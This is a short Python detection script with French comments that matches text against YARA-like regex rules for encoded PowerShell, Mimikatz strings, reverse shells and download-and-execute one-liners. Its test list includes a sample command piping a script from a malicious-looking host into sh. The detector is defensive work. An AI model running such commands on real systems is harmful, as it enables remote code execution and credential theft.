import re

# Règles de détection simplifiées (inspirées de YARA)
REGLES = [
    {
        "nom": "POWERSHELL_ENCODED",
        "description": "PowerShell avec payload encodé en base64",
        "severite": "HAUTE",
        "pattern": re.compile(r"powershell.*-enc.*[A-Za-z0-9+/]{50,}", re.I),
    },
    {
        "nom": "MIMIKATZ_STRINGS",
        "description": "Strings caractéristiques de Mimikatz",
        "severite": "CRITIQUE",
        "pattern": re.compile(r"sekurlsa|lsadump|kerberos::ptc", re.I),
    },
    {
        "nom": "REVERSE_SHELL",
        "description": "Tentative de reverse shell",
        "severite": "CRITIQUE",
        "pattern": re.compile(r"bash\s+-i.*>&.*\/dev\/tcp|nc\s+-e\s+\/bin\/", re.I),
    },
    {
        "nom": "SUSPICIOUS_DOWNLOAD",
        "description": "Téléchargement et exécution en une ligne",
        "severite": "HAUTE",
        "pattern": re.compile(r"(wget|curl).*\|.*sh|iex.*downloadstring", re.I),
    },
]

def scanner_texte(texte):
    """Scanne un texte contre les règles de détection."""
    alertes = []
    for regle in REGLES:
        if regle["pattern"].search(texte):
            alertes.append({
                "regle": regle["nom"],
                "severite": regle["severite"],
                "description": regle["description"]
            })
    return alertes

# Test
commandes_suspectes = [
    "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
    "wget http://malware.xyz/shell.sh | sh",
    "ls -la /home",  # Bénin
]

for cmd in commandes_suspectes:
    alertes = scanner_texte(cmd)
    status = f"{len(alertes)} alerte(s)" if alertes else "OK"
    print(f"[{status}] {cmd[:60]}")
    for a in alertes:
        print(f"  → [{a['severite']}] {a['regle']}: {a['description']}")
